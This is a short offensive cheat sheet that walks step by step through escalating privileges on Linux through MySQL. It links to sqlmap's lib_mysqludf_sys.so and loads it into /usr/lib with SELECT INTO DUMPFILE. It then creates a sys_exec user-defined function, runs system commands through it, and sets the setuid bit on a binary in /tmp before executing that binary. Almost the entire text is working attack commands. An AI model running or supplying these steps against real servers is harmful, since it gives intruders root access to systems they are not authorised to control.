- - -
## Steps:
Download the ib_mysqludf_sys.so then transfer over to target
- For [x32-Bit](https://github.com/sqlmapproject/sqlmap/blob/master/data/udf/mysql/linux/32/lib_mysqludf_sys.so_) 
- For [x64-Bit](https://github.com/sqlmapproject/sqlmap/blob/master/data/udf/mysql/linux/64/lib_mysqludf_sys.so_) 

```sh
mysql -u root
```

```mysql
use mysql;
create table hack(line blob);
insert into hack values(load_file('/tmp/lib_mysqludf_sys.so'));
select * from hack into dumpfile '/usr/lib/lib_mysqludf_sys.so';
create function sys_exec returns some integer soname'lib_mysqludf_sys.so';

select sys_exec('id >/tmp/out; chown user:user /tmp/out');
select sys_exec('chmod + s /tmp/setuid');

```

```sh
/tmp/setuid
```

- - -


